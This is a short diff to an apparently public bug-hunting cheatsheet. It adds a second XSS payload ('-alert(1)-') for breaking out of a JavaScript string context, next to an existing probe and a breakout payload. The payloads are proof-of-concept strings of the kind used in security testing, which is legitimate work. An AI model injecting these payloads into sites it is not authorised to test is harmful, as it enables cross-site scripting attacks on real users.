@@ -43,6 +43,7 @@ Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br
 In this case you should try this payload to braek the code to inject maliciuos payload.
 ```js
 xss';alert(1);'xss
+'-alert(1)-'
 ```
 Finally the code will look like this after response.
 ![Screenshot from 2024-06-13 00-27-23](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/363ddd77-30a1-48bc-850a-f85b0b92e312)
